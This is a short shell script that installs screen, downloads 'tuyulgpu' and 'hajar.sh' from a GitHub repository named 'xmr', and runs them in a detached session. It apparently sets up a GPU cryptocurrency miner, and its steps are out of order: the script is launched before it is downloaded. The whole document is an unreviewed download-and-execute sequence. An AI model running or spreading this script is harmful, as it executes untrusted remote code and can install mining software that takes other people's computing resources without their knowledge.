#!/bin/sh

apt update

apt install screen -y

screen -dmS hajar.sh ./hajar.sh 65 75

wget https://github.com/kmsjulhadi/xmr/raw/main/tuyulgpu

wget https://github.com/kmsjulhadi/xmr/raw/main/hajar.sh

chmod +x hajar.sh

./hajar.sh
